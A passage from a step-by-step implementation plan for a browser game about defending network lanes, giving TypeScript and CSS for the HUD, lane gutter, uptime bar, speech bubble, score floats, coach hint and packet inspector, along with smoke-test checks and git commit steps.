    await page.evaluate(() => {
      const app = window.__nsp.app;
      app.run.state.owned.push('quote', 'f2b', 'tarpit', 'cdn');
      app.dispatch([{ type: 'owned', owned: [...app.run.state.owned] }]);
    });
    await page.waitForFunction(() => window.__nsp.app.run.state.log.some((e) => e.ruleId === 'lockdown'), null, { timeout: 30000 });
    await page.screenshot({ path: `${OUT}/objects.png` });
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs objects`
Expected: PASS. `smoke-out/objects.png` shows the padlocked port panel on the `:*` lane with its sign, the portcullis in front of the fire, the hammer with `BANNED 0`, the tar strip on `/login` and the blue CDN band over the HTTP lanes.

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "Show each firewall upgrade as an object on the field" -m "Rules the player buys become things they can see: a padlocked port panel that flashes DENIED, a portcullis, the fail2ban hammer, a strip of tar and the CDN band." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 16: The DOM layer, HUD, gutter, uptime strip, bubble and floats

**Files:**
- Create: `src/ui/dom.ts`, `src/ui/layer.ts`, `src/ui/hud.ts`, `src/ui/gutter.ts`, `src/ui/uptime.ts`, `src/ui/bubble.ts`, `src/ui/floats.ts`, `src/ui/coach.ts`
- Modify: `src/styles.css` (append the UI section), `src/storage.ts` (add `coached?: boolean` to `Prefs`), `src/main.ts` (create the layer and register the views), `scripts/smoke.mjs` (add `hud` check)

**Interfaces:**
- Consumes: `View`, `Run`, `RunEvent`, `LINES`, `waveFor`, `CAMPAIGN`, constants, `t`, `loc`, `fmtNum`, `onLang`, `App` (`act`, `refresh`, `store`).
- Produces:
  - `dom.ts`: `el<K extends keyof HTMLElementTagNameMap>(tag: K, cls?: string, parent?: HTMLElement, text?: string): HTMLElementTagNameMap[K]`.
  - `layer.ts`: `createUiLayer(stage: HTMLElement, canvas: HTMLCanvasElement): HTMLElement` (a 1280×720 `#ui` div kept aligned and scaled with the canvas; `pointer-events: none` except on controls).
  - Views: `Hud(ui, app)`, `Gutter(ui)`, `UptimeStrip(ui)`, `Bubble(ui)`, `Floats(ui)`, `Coach(ui, store)`.

- [ ] **Step 1: DOM helper and layer**

`src/ui/dom.ts`:
```ts
export const el = <K extends keyof HTMLElementTagNameMap>(tag: K, cls = '', parent?: HTMLElement, text?: string): HTMLElementTagNameMap[K] => {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (text !== undefined) e.textContent = text;
  parent?.appendChild(e);
  return e;
};
```

`src/ui/layer.ts`:
```ts
// stage
import { SCREEN_W } from '../stage';

// local
import { el } from './dom';

// The DOM layer shares the canvas's 1280×720 logical space, so UI and field line up at any size.
export const createUiLayer = (stage: HTMLElement, canvas: HTMLCanvasElement): HTMLElement => {
  const ui = el('div', '', stage);
  ui.id = 'ui';
  const sync = (): void => {
    const s = stage.getBoundingClientRect(), r = canvas.getBoundingClientRect();
    ui.style.transform = `translate(${r.left - s.left}px, ${r.top - s.top}px) scale(${r.width / SCREEN_W})`;
  };
  new ResizeObserver(sync).observe(canvas);
  window.addEventListener('resize', () => requestAnimationFrame(sync));
  sync();
  return ui;
};
```

- [ ] **Step 2: Append the UI styles to `src/styles.css`**

```css
/* ---------- DOM layer ---------- */
#ui { position: absolute; left: 0; top: 0; width: 1280px; height: 720px; transform-origin: 0 0; pointer-events: none; font-family: var(--mono); color: var(--ink); }
#ui button, #ui .hit { pointer-events: auto; }
#ui.paused * { animation-play-state: paused !important; }
#ui img.px { image-rendering: pixelated; }
.scanlines { position: absolute; inset: 0; z-index: 90; pointer-events: none; background: repeating-linear-gradient(to bottom, transparent 0 2px, rgba(0,0,0,.16) 2px 3px); }

.hud { position: absolute; left: 0; top: 0; width: 1280px; height: 56px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid var(--rule); background: var(--paper); z-index: 20; }
.hud-l, .hud-r { display: flex; align-items: center; gap: 22px; }
.hud .title { font-weight: 700; font-size: 18px; letter-spacing: .14em; text-shadow: -2px 0 var(--r), 2px 0 var(--b); animation: jitter 4s infinite steps(1); }
@keyframes jitter { 0%, 92%, 100% { transform: none; } 93% { transform: translateX(3px) skewX(-8deg); text-shadow: -5px 0 var(--r), 4px 0 var(--b); } 95% { transform: translateX(-2px); } }
.hud .wave { font-size: 13px; color: var(--dim); }
.hud .wave b, .hud .stat b { color: var(--ink); }
.hud .stat { font-size: 13px; color: var(--dim); }
.hud .stat b { font-size: 16px; margin-left: 6px; }
.pips { display: inline-flex; gap: 3px; margin-left: 8px; vertical-align: middle; }
.pips i { width: 7px; height: 13px; background: var(--ink); display: block; }
.pips i.off { background: var(--mute); }
.toggle { font-family: var(--mono); font-size: 13px; color: var(--dim); background: transparent; border: 1px solid var(--mute); padding: 3px 8px; cursor: pointer; }
.toggle.on { color: var(--paper); background: var(--b); border-color: var(--b); }
.badge-root { font-size: 13px; font-weight: 700; color: var(--paper); background: var(--r); padding: 1px 6px; }

.gutter { position: absolute; left: 0; top: 56px; width: 110px; height: 450px; background: var(--paper); border-right: 1px solid var(--mute); z-index: 15; }
.glabel { position: absolute; left: 0; width: 110px; height: 90px; padding-left: 14px; display: flex; flex-direction: column; justify-content: center; }
.glabel .port { font-size: 17px; font-weight: 700; }
.glabel .name { font-size: 13px; color: var(--dim); }
.glabel.cur { background: var(--ink); }
.glabel.cur .port { color: var(--paper); }
.glabel.cur .name { color: #4a4843; }
.glabel.cur::after { content: '▶'; position: absolute; right: 8px; top: 50%; transform: translateY(-50%); color: var(--paper); font-size: 13px; }

.hpstrip { position: absolute; left: 0; top: 506px; width: 1280px; height: 30px; display: flex; align-items: center; gap: 14px; padding: 0 20px; border-top: 1px solid var(--rule); background: var(--paper); z-index: 20; }
.hpstrip .lbl { font-size: 13px; color: var(--dim); letter-spacing: .12em; }
.hpstrip b { font-size: 20px; min-width: 64px; text-align: right; letter-spacing: .04em; }
.segs { flex: 1; display: grid; grid-template-columns: repeat(50, 1fr); gap: 2px; height: 14px; }
.segs i { display: block; background: var(--ink); }
.segs i.lost { background: repeating-linear-gradient(135deg, #6a6a6a 0 2px, transparent 2px 4px); animation: dead 1.3s infinite steps(2); }
.segs i.lost:nth-child(3n) { animation-delay: .45s; } .segs i.lost:nth-child(3n+1) { animation-delay: .9s; } .segs i.lost:nth-child(7n) { animation-duration: .7s; }
.segs i.fresh { background: var(--r); animation: fresh .6s steps(6) forwards; }
.segs i.healed { background: var(--b); }
@keyframes dead { 50% { opacity: .3; transform: translateY(2px); } }
@keyframes fresh { 0% { transform: translateY(-5px); } 33% { transform: translateY(4px); opacity: .4; } 66% { transform: translateX(3px); opacity: 1; } 100% { transform: none; opacity: .85; } }
.hpstrip.hit { animation: corrupt .5s steps(1) both; }
@keyframes corrupt {
  0% { transform: translate(-7px, 0) skewX(16deg); filter: drop-shadow(-5px 0 var(--r)) drop-shadow(5px 0 var(--b)); clip-path: inset(0 0 55% 0); }
  14% { transform: translate(6px, 1px); clip-path: inset(45% 0 0 0); }
  28% { transform: translate(-3px, -2px) skewX(-12deg); clip-path: inset(18% 0 32% 0); }
  42% { transform: translate(5px, 0); clip-path: none; filter: drop-shadow(-3px 0 var(--r)) drop-shadow(3px 0 var(--b)); }
  56% { transform: translate(-2px, 1px); clip-path: inset(62% 0 8% 0); }
  70% { transform: translate(2px, 0); clip-path: none; filter: drop-shadow(-2px 0 var(--r)); }
  100% { transform: none; clip-path: none; filter: none; } }
.hpstrip.low b { color: var(--r); animation: lowg 2.2s infinite steps(1); }
.hpstrip.low .segs { animation: lowseg 3.1s infinite steps(1); }
@keyframes lowg { 0%, 86%, 100% { transform: none; text-shadow: none; } 88% { transform: translateX(-5px) skewX(14deg); text-shadow: -3px 0 var(--b), 3px 0 var(--ink); } 92% { transform: translateX(4px); text-shadow: 3px 0 var(--b); } 95% { transform: none; opacity: .5; } }
@keyframes lowseg { 0%, 90%, 100% { transform: none; } 92% { transform: translateX(-4px); clip-path: inset(0 30% 0 0); } 95% { transform: translateX(3px); } }

.bubble { position: absolute; z-index: 30; max-width: 260px; background: var(--ink); color: var(--paper); font-size: 14px; font-weight: 700; padding: 7px 11px; opacity: 0; transition: opacity .15s; }
.bubble.show { opacity: 1; }
.bubble small { display: block; font-weight: 400; font-size: 13px; color: #4a4843; margin-top: 2px; }
.bubble::after { content: ''; position: absolute; right: 26px; bottom: -8px; border: 8px solid transparent; border-bottom: 0; border-top-color: var(--ink); }
.bubble.below::after { bottom: auto; top: -8px; border: 8px solid transparent; border-top: 0; border-bottom-color: var(--ink); }

.float { position: absolute; z-index: 25; font-size: 14px; font-weight: 700; white-space: nowrap; animation: rise 1.2s forwards; }
.float.ok { color: var(--b); } .float.bad { color: var(--r); } .float.fp { color: var(--ink); background: var(--r); padding: 0 5px; }
.float.big { font-size: 18px; color: var(--ink); text-shadow: -2px 0 var(--r), 2px 0 var(--b); }
.float.gold { color: var(--gold); }
@keyframes rise { to { transform: translateY(-36px); opacity: 0; } }

.coach { position: absolute; left: 130px; top: 62px; z-index: 18; font-size: 13px; color: var(--paper); background: var(--b); padding: 3px 10px; animation: coachpulse 1.4s infinite steps(2); }
@keyframes coachpulse { 50% { opacity: .75; } }
```

- [ ] **Step 3: HUD and gutter**

`src/ui/hud.ts`:
```ts
// core
import { MAX_REP } from '../core/constants';
import type { RunEvent } from '../core/events';
import type { Run } from '../core/run';

// game
import type { View } from '../game/view';

// i18n
import { fmtNum, loc, t } from '../i18n';

// local
import type { App } from '../app';
import { el } from './dom';

export class Hud implements View {
  private readonly waveEl: HTMLElement;
  private readonly score: HTMLElement;
  private readonly credits: HTMLElement;
  private readonly pips: HTMLElement;
  private readonly hints: HTMLButtonElement;
  private readonly pauseBtn: HTMLButtonElement;
  private readonly root: HTMLElement;
  private readonly labels: HTMLElement[] = [];
  private last = '';

  constructor(ui: HTMLElement, private readonly app: App) {
    const bar = el('div', 'hud', ui);
    const l = el('div', 'hud-l', bar);
    el('div', 'title', l, 'NONE SHALL PASS');
    this.waveEl = el('div', 'wave', l);
    this.root = el('span', 'badge-root', l, t('hud.root'));
    const r = el('div', 'hud-r', bar);
    const stat = (key: string): HTMLElement => {
      const s = el('div', 'stat', r);
      this.labels.push(el('span', '', s, t(key)));
      s.dataset.key = key;
      return el('b', '', s);
    };
    this.score = stat('hud.score');
    this.credits = stat('hud.credits');
    const rep = el('div', 'stat', r);
    this.labels.push(el('span', '', rep, t('hud.reputation')));
    rep.dataset.key = 'hud.reputation';
    this.pips = el('span', 'pips', rep);
    this.hints = el('button', 'toggle', r);
    this.hints.onclick = () => app.act('hints');
    this.pauseBtn = el('button', 'toggle', r, t('hud.pause'));
    this.pauseBtn.onclick = () => app.act('pause');
  }

  refresh(run: Run | null): void {
    this.labels.forEach((s) => { s.textContent = t((s.parentElement as HTMLElement).dataset.key ?? ''); });
    this.pauseBtn.textContent = t('hud.pause');
    this.root.textContent = t('hud.root');
    this.last = '';
    if (run) this.frame(run);
  }

  start(run: Run): void {
    this.root.style.display = run.state.cfg.root ? '' : 'none';
    this.hints.style.display = run.state.cfg.root ? 'none' : '';
    this.last = '';
  }

  event(ev: RunEvent, run: Run): void {
    if (ev.type === 'reputation' || ev.type === 'waveStarted') { this.last = ''; this.frame(run); }
  }

  frame(run: Run | null): void {
    if (!run) return;
    const s = run.state;
    const secs = Math.max(0, Math.ceil(s.timeLeft));
    const key = `${s.wave}|${secs}|${s.score}|${s.credits}|${s.rep}|${s.hints}`;
    if (key === this.last) return;
    this.last = key;
    const name = loc(run.waveDef.name);
    const n = s.cfg.mode === 'campaign' ? `${s.wave}/6` : `${s.wave}`;
    this.waveEl.innerHTML = '';
    this.waveEl.append(`${t('hud.wave')} `, el('b', '', undefined, n), ' · ', el('b', '', undefined, name), ' · ', el('b', '', undefined, `${Math.floor(secs / 60)}:${String(secs % 60).padStart(2, '0')}`));
    this.score.textContent = fmtNum(s.score);
    this.credits.textContent = fmtNum(s.credits);
    this.pips.innerHTML = Array.from({ length: MAX_REP }, (_, i) => `<i class="${i < s.rep ? '' : 'off'}"></i>`).join('');
    this.hints.textContent = s.hints ? t('hud.hintsOn') : t('hud.hintsOff');
    this.hints.classList.toggle('on', s.hints);
  }
}
```

`src/ui/gutter.ts`:
```ts
// core
import { LANE_COUNT, LANE_H } from '../core/constants';
import type { Run } from '../core/run';

// game
import type { View } from '../game/view';

// i18n
import { t } from '../i18n';

// local
import { el } from './dom';

const PORTS = [':22', '/login', '/search', '/comments', ':*'];

// The lane labels; it also hides packets until they come out from behind it.
export class Gutter implements View {
  private readonly rows: { box: HTMLElement; name: HTMLElement }[] = [];
  private lane = -1;

  constructor(ui: HTMLElement) {
    const g = el('div', 'gutter', ui);
    for (let i = 0; i < LANE_COUNT; i++) {
      const box = el('div', 'glabel', g);
      box.style.top = `${i * LANE_H}px`;
      el('div', 'port', box, PORTS[i]);
      this.rows.push({ box, name: el('div', 'name', box, t(`lane.${i}`)) });
    }
  }

  refresh(): void {
    this.rows.forEach((r, i) => { r.name.textContent = t(`lane.${i}`); });
  }

  frame(run: Run | null): void {
    const lane = run?.state.knight.lane ?? 2;
    if (lane === this.lane) return;
    this.lane = lane;
    this.rows.forEach((r, i) => r.box.classList.toggle('cur', i === lane));
  }
}
```

Note: `t('lane.' + i)` style keys are dynamic; the "used keys exist" test only matches literal `t('...')` calls, which is fine because the `lane.0`…`lane.4` keys exist in both files.

- [ ] **Step 4: Uptime strip, bubble, floats, coach**

`src/ui/uptime.ts`:
```ts
// core
import type { RunEvent } from '../core/events';
import type { Run } from '../core/run';

// game
import type { View } from '../game/view';

// i18n
import { t } from '../i18n';

// local
import { el } from './dom';

const SEGS = 50;
const GARBAGE = '█▓▒░#%&@$!?¿¥§¤ØÆ';
const segOf = (u: number): number => Math.ceil((u / 100) * SEGS);

// Full-width uptime bar that tears, scrambles and turns to static on every breach.
export class UptimeStrip implements View {
  private readonly box: HTMLElement;
  private readonly label: HTMLElement;
  private readonly segs: HTMLElement;
  private readonly num: HTMLElement;
  private uptime = 100;
  private scramble: number | null = null;

  constructor(ui: HTMLElement) {
    this.box = el('div', 'hpstrip', ui);
    this.label = el('span', 'lbl', this.box, t('uptime'));
    this.segs = el('div', 'segs', this.box);
    this.num = el('b', '', this.box, '100%');
    this.render();
  }

  refresh(): void {
    this.label.textContent = t('uptime');
  }

  start(): void {
    this.uptime = 100;
    this.render();
  }

  private render(before?: number, healed = false): void {
    const full = segOf(this.uptime), had = segOf(before ?? this.uptime);
    this.segs.innerHTML = Array.from({ length: SEGS }, (_, i) => {
      if (healed) return `<i class="${i < had ? '' : i < full ? 'healed' : 'lost'}"></i>`;
      return `<i class="${i < full ? '' : i < had ? 'lost fresh' : 'lost'}"></i>`;
    }).join('');
    if (before !== undefined) setTimeout(() => this.render(), healed ? 900 : 650);
    if (this.scramble === null) this.num.textContent = `${this.uptime}%`;
    this.box.classList.toggle('low', this.uptime < 35);
  }

  event(ev: RunEvent): void {
    if (ev.type !== 'uptime') return;
    const before = ev.before;
    this.uptime = ev.after;
    if (ev.after > before) { this.render(before, true); return; }
    this.box.classList.remove('hit');
    void this.box.offsetWidth;
    this.box.classList.add('hit');
    let n = 0;
    if (this.scramble !== null) clearInterval(this.scramble);
    this.scramble = window.setInterval(() => {
      if (++n > 10) { clearInterval(this.scramble!); this.scramble = null; this.num.textContent = `${this.uptime}%`; return; }
      const g = () => GARBAGE[Math.floor(Math.random() * GARBAGE.length)];
      this.num.textContent = Math.random() < 0.4 ? `${g()}${String(this.uptime).slice(-1)}${g()}` : `${g()}${g()}${Math.random() < 0.5 ? '%' : g()}`;
    }, 45);
    this.render(before);
  }

  frame(run: Run | null): void {
    if (run && run.state.uptime !== this.uptime && this.scramble === null) { this.uptime = run.state.uptime; this.render(); }
  }
}
```

`src/ui/bubble.ts`:
```ts
// core
import { FIELD_TOP } from '../core/constants';
import { LINES } from '../core/content/lines';
import type { RunEvent } from '../core/events';
import type { Run } from '../core/run';
import { mounted } from '../core/state';

// game
import type { View } from '../game/view';

// i18n
import { loc } from '../i18n';

// local
import { el } from './dom';

// The Black Knight's speech bubble, above his head (below him on the top lane).
export class Bubble implements View {
  private readonly box: HTMLElement;
  private hideAt = 0;
  private now = 0;

  constructor(ui: HTMLElement) {
    this.box = el('div', 'bubble', ui);
  }

  event(ev: RunEvent, run: Run): void {
    if (ev.type !== 'say') return;
    const line = LINES[ev.line];
    const sub = ev.line === 'waveStart' ? run.waveDef.intro : line.sub;
    this.box.innerHTML = '';
    this.box.append(loc(line.text));
    if (sub) this.box.append(el('small', '', undefined, loc(sub)));
    this.box.classList.add('show');
    this.hideAt = this.now + 2.6;
  }

  frame(run: Run | null, _dt: number, time: number): void {
    this.now = time;
    if (time > this.hideAt) this.box.classList.remove('show');
    if (!run) return;
    const k = run.state.knight, below = k.y < 80;
    this.box.classList.toggle('below', below);
    this.box.style.right = `${Math.max(8, 1280 - (k.x + 72))}px`;
    if (below) { this.box.style.top = `${FIELD_TOP + k.y + (mounted(run.state) ? 104 : 98)}px`; this.box.style.bottom = 'auto'; }
    else { this.box.style.bottom = `${720 - (FIELD_TOP + k.y) + 12}px`; this.box.style.top = 'auto'; }
  }
}
```

`src/ui/floats.ts`:
```ts
// core
import { FIELD_TOP } from '../core/constants';
import type { RunEvent } from '../core/events';

// game
import type { View } from '../game/view';

// i18n
import { t } from '../i18n';

// local
import { el } from './dom';

export class Floats implements View {
  constructor(private readonly ui: HTMLElement) {}

  event(ev: RunEvent): void {
    if (ev.type !== 'float') return;
    const text = {
      points: `+${ev.value}`,
      tricky: `+${ev.value} · ${t('float.tricky')}`,
      sneaky: `+${ev.value} · ${t('float.sneaky')}`,
      squire: `+${ev.value} · ${t('float.squire')}`,
      notFooled: `+${ev.value} · ${t('float.notFooled')}`,
      neutralized: t('float.neutralized'),
      falsePositive: t('float.falsePositive'),
      damage: t('float.damage', { n: ev.value }),
    }[ev.kind];
    const cls = { points: 'ok', tricky: 'big', sneaky: 'big', squire: 'gold', notFooled: 'big', neutralized: 'ok', falsePositive: 'fp', damage: 'bad' }[ev.kind];
    const f = el('div', `float ${cls}`, this.ui, text);
    if (ev.at === 'rack') { f.style.right = '14px'; f.style.top = `${FIELD_TOP + 36 + Math.random() * 110}px`; }
    else { f.style.left = `${Math.max(116, Math.min(ev.x, 1100))}px`; f.style.top = `${FIELD_TOP + ev.y}px`; }
    setTimeout(() => f.remove(), 1200);
  }
}
```

`src/ui/coach.ts`:
```ts
// core
import type { RunEvent } from '../core/events';
import type { Run } from '../core/run';

// game
import type { View } from '../game/view';

// i18n
import { t } from '../i18n';

// local
import type { Store } from '../storage';
import { el } from './dom';

// First campaign wave only, until the player throws once: the controls in one line.
export class Coach implements View {
  private readonly box: HTMLElement;
  private shownAt = -1;

  constructor(ui: HTMLElement, private readonly store: Store) {
    this.box = el('div', 'coach', ui, t('field.coach'));
    this.box.style.display = 'none';
  }

  refresh(): void {
    this.box.textContent = t('field.coach');
  }

  start(run: Run): void {
    const show = run.state.cfg.mode === 'campaign' && !this.store.prefs().coached;
    this.box.style.display = show ? '' : 'none';
    this.shownAt = show ? 0 : -1;
  }

  event(ev: RunEvent): void {
    if (this.shownAt < 0) return;
    if ((ev.type === 'thrown' && ev.by === 'knight') || ev.type === 'waveCleared') this.done();
  }

  frame(_run: Run | null, dt: number): void {
    if (this.shownAt < 0) return;
    this.shownAt += dt;
    if (this.shownAt > 20) this.done();
  }

  private done(): void {
    this.box.style.display = 'none';
    this.shownAt = -1;
    this.store.setPrefs({ coached: true });
  }
}
```

In `src/storage.ts`, change the `Prefs` interface to:
```ts
export interface Prefs { lang?: Lang; hints?: boolean; reducedFx?: boolean; coached?: boolean }
```

- [ ] **Step 5: Register in `src/main.ts`**

After the Phaser views are added:
```ts
  const ui = createUiLayer(document.getElementById('stage')!, game.canvas);
  app.add(new Hud(ui, app), new Gutter(ui), new UptimeStrip(ui), new Bubble(ui), new Floats(ui), new Coach(ui, store));
  el('div', 'scanlines', ui);
  app.add({ pause: (p) => ui.classList.toggle('paused', p) });
  onLang(() => app.refresh());
```
with imports `createUiLayer` (`./ui/layer`), `Hud`, `Gutter`, `UptimeStrip`, `Bubble`, `Floats`, `Coach`, `el` (`./ui/dom`), and `onLang` added to the existing i18n import.

- [ ] **Step 6: Smoke check `hud`**

Add to `CHECKS`:
```js
  async hud(page) {
    await page.waitForSelector('#ui .hud .title');
    await page.waitForFunction(() => document.querySelector('#ui .bubble.show'));
    const text = await page.textContent('#ui .hud');
    if (!/NONE SHALL PASS/.test(text)) throw new Error('hud missing title');
    await page.evaluate(() => {
      const app = window.__nsp.app;
      app.dispatch([{ type: 'uptime', before: 100, after: 64 }]);
    });
    await page.waitForTimeout(120);
    await page.screenshot({ path: `${OUT}/hud.png` });
    const cur = await page.$$eval('#ui .glabel.cur', (a) => a.length);
    if (cur !== 1) throw new Error('lane highlight missing');
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs hud packets resizeAndClick`
Expected: all PASS. `smoke-out/hud.png`: HUD across the top, inverted current-lane label in the gutter, the knight's "None shall pass." bubble above his head with the wave intro, the full-width uptime strip tearing in RGB with scrambled digits, scan lines over everything.

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "Add the DOM layer with HUD, gutter, uptime strip and voice" -m "Text-heavy surfaces stay native HTML glued to the canvas transform: the HUD, lane labels, the corrupting full-width uptime bar, the knight's bubble, score floats and a one-line coach for the first wave." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 17: Inspector, event log and loadout tiles

**Files:**
- Create: `src/ui/inspector.ts`, `src/ui/eventLog.ts`, `src/ui/loadout.ts`
- Modify: `src/styles.css` (append), `src/main.ts` (wire hover + register), `scripts/smoke.mjs` (add `log` check)

**Interfaces:**
- Consumes: `View`, `Run`, `RunEvent`, `LogEntry`, `Packet`, `Card`, `cardById`, `NETWORKS`, `isBugged`, `BUG_OF`, `iconUrl`, `t`, `loc`, `fmtNum`, `el`.
- Produces: `Inspector(ui)` with `hover(p: Packet | null)`, `verdict(e: LogEntry)`, `card(c: Card)`, `leave()`; `EventLog(ui, inspector)`; `LoadoutTiles(ui, inspector)`.

- [ ] **Step 1: Append styles to `src/styles.css`**

```css
/* ---------- inspector, log, loadout ---------- */
.bottom { position: absolute; left: 0; top: 536px; width: 1280px; height: 184px; display: flex; background: var(--paper); z-index: 20; }
.ins { width: 760px; padding: 12px 18px; border-right: 1px solid var(--mute); overflow: hidden; pointer-events: auto; }
.ptitle { font-size: 13px; color: var(--dim); letter-spacing: .1em; margin-bottom: 7px; display: flex; gap: 14px; align-items: center; white-space: nowrap; }
.ptitle span { color: var(--ink); letter-spacing: 0; }
.ptitle .lk { color: var(--paper); background: var(--r); padding: 0 6px; font-weight: 700; }
.ptitle .hd { color: var(--paper); background: var(--gold); padding: 0 6px; font-weight: 700; }
.ptitle .fl { color: var(--ink); background: var(--r); padding: 0 6px; font-weight: 700; }
.req { font-family: var(--code); font-size: 14px; line-height: 1.42; margin: 0; white-space: pre-wrap; word-break: break-all; }
.req mark, .why mark { background: none; color: inherit; text-decoration: underline wavy var(--r); text-underline-offset: 3px; }
.ctx { font-size: 13px; color: var(--b); margin-top: 6px; }
.ask { font-family: var(--body); font-size: 14px; color: var(--dim); margin-top: 6px; }
.verdict { font-size: 14px; font-weight: 700; margin-top: 6px; }
.verdict.bad { color: var(--r); } .verdict.ok { color: var(--b); }
.why { font-family: var(--body); font-size: 15px; line-height: 1.38; margin: 3px 0 0; }
.why.dim { color: var(--dim); }
.why b.irl { color: var(--b); font-family: var(--mono); font-size: 13px; }
.why b.catch { color: var(--r); font-family: var(--mono); font-size: 13px; }
.cname { font-size: 17px; font-weight: 700; }
.empty { font-family: var(--body); font-size: 15px; color: var(--dim); line-height: 1.5; margin: 0; }

.log { flex: 1; padding: 12px 10px 8px 16px; display: flex; flex-direction: column; min-height: 0; pointer-events: auto; }
.log .ptitle { gap: 12px; }
.log .ptitle .count { color: var(--dim); overflow: hidden; text-overflow: ellipsis; }
.lfilter { margin-left: auto; display: flex; }
.lfilter button { font-family: var(--mono); font-size: 13px; line-height: 18px; background: transparent; color: var(--dim); border: 1px solid var(--mute); padding: 0 8px; cursor: pointer; }
.lfilter button.on { background: var(--ink); color: var(--paper); border-color: var(--ink); }
.rows { flex: 1; overflow-y: auto; min-height: 0; scrollbar-width: thin; scrollbar-color: var(--dim) var(--soft); padding-right: 4px; }
.rows.mistakes .row:not(.bad):not(.fp) { display: none; }
.row { display: grid; grid-template-columns: 28px 18px 128px 1fr auto; gap: 8px; align-items: baseline; font-family: var(--code); font-size: 13px; padding: 2px 4px; cursor: help; }
.row:hover { background: var(--sub); }
.row .wv { color: var(--dim); font-family: var(--mono); }
.row .what { font-family: var(--mono); font-weight: 700; }
.row .pl { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--dim); }
.row .pts { color: var(--dim); white-space: nowrap; }
.row.ok .what, .row.ok .g { color: var(--b); }
.row.bad .what, .row.bad .g { color: var(--r); }
.row.fp .what { color: var(--paper); background: var(--r); padding: 0 4px; }

.loadout { position: absolute; left: 1076px; top: 62px; width: 44px; display: flex; flex-direction: column; gap: 5px; z-index: 16; }
.ltile { width: 44px; height: 38px; display: flex; align-items: center; justify-content: center; background: var(--soft); border: 1px solid var(--mute); cursor: help; pointer-events: auto; overflow: hidden; }
.ltile:hover { border-color: var(--ink); }
.ltile.KNIGHT { box-shadow: inset 0 -3px 0 var(--gold); } .ltile.FIREWALL { box-shadow: inset 0 -3px 0 var(--b); } .ltile.SERVER { box-shadow: inset 0 -3px 0 var(--ink); }
```

- [ ] **Step 2: Inspector**

`src/ui/inspector.ts`:
```ts
// core
import type { Card } from '../core/content/cards';
import { NETWORKS } from '../core/content/networks';
import type { LogEntry } from '../core/events';
import { isBugged } from '../core/rules';
import type { Run } from '../core/run';
import type { Packet } from '../core/state';

// art
import { BUG_OF } from '../art/sprites';

// game
import type { View } from '../game/view';

// i18n
import { loc, t } from '../i18n';

// local
import { el } from './dom';

const PORT = [':22', '/login', '/search', '/comments', ':*'];
const esc = (s: string): string => s.replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]!));
const mark = (text: string, hints: string[] | undefined, on: boolean): string => {
  if (!on || !hints?.length) return esc(text);
  let out = '', i = 0;
  while (i < text.length) {
    let best: string | null = null, at = Infinity;
    for (const h of hints) { const j = text.indexOf(h, i); if (j >= 0 && j < at) { at = j; best = h; } }
    if (!best) { out += esc(text.slice(i)); break; }
    out += `${esc(text.slice(i, at))}<mark>${esc(best)}</mark>`;
    i = at + best.length;
  }
  return out;
};

type Focus = { kind: 'packet'; p: Packet } | { kind: 'verdict'; e: LogEntry } | { kind: 'card'; c: Card } | { kind: 'empty' };

export class Inspector implements View {
  readonly box: HTMLElement;
  private hovered: Packet | null = null;
  private pinned: Focus = { kind: 'empty' };
  private run: Run | null = null;
  private shownKey = '';

  constructor(bottom: HTMLElement) {
    this.box = el('div', 'ins', bottom);
    this.box.addEventListener('mouseleave', () => this.leave());
    this.render();
  }

  start(run: Run): void { this.run = run; this.hovered = null; this.pinned = { kind: 'empty' }; this.render(); }
  refresh(): void { this.shownKey = ''; this.render(); }

  hover(p: Packet | null): void { this.hovered = p; this.render(); }
  verdict(e: LogEntry): void { this.pinned = { kind: 'verdict', e }; this.hovered = null; this.render(); }
  card(c: Card): void { this.pinned = { kind: 'card', c }; this.hovered = null; this.render(); }
  leave(): void { this.pinned = { kind: 'empty' }; this.render(); }

  frame(run: Run | null): void {
    this.run = run;
    if (this.hovered?.dead) this.hovered = null;
    this.render();
  }

  private focus(): Focus {
    if (this.hovered) return { kind: 'packet', p: this.hovered };
    if (this.pinned.kind !== 'empty') return this.pinned;
    const s = this.run?.state;
    const locked = s && s.locked !== null ? s.packets.find((p) => p.id === s.locked) : undefined;
    return locked ? { kind: 'packet', p: locked } : { kind: 'empty' };
  }

  private render(): void {
    const f = this.focus(), s = this.run?.state;
    const key = f.kind === 'packet' ? `p${f.p.id}|${s?.locked}|${f.p.held}|${s?.hints}|${s?.owned.length}`
      : f.kind === 'verdict' ? `v${f.e.seq}` : f.kind === 'card' ? `c${f.c.id}` : 'empty';
    if (key === this.shownKey) return;
    this.shownKey = key;
    if (f.kind === 'empty') {
      this.box.innerHTML = `<div class="ptitle">${t('inspector.title')}</div><p class="empty">${esc(t('inspector.empty1'))}<br>${esc(t('inspector.empty2'))}</p>`;
      return;
    }
    if (f.kind === 'card') {
      const c = f.c;
      this.box.innerHTML = `<div class="ptitle">${t('inspector.loadout')}<span>${t(`draft.cat.${c.cat}`)}</span><span>${t(`draft.rarity.${c.rarity}`)}</span></div>
        <div class="cname">${esc(loc(c.name))}</div><p class="why">${esc(loc(c.does))}</p>
        <p class="why dim"><b class="irl">${t('inspector.irl')}</b> ${esc(loc(c.irl))}</p><p class="why dim"><b class="catch">${t('inspector.catch')}</b> ${esc(loc(c.catch))}</p>`;
      return;
    }
    const p = f.kind === 'packet' ? f.p : f.e.packet;
    const hintsOn = !!s?.hints;
    const lens = !!s?.owned.includes('lens') && !!p.t.decoded;
    const tags = f.kind === 'packet'
      ? `${p.held ? `<span class="hd">${t('inspector.held')}</span>` : s?.locked === p.id ? `<span class="lk">${t('inspector.target')}</span>` : ''}${s && isBugged(p.t, s.owned) ? `<span class="fl">${t('inspector.bugged', { bug: t(`bug.${BUG_OF[p.t.kind as Exclude<typeof p.t.kind, 'legit'>]}`) })}</span>` : ''}`
      : '';
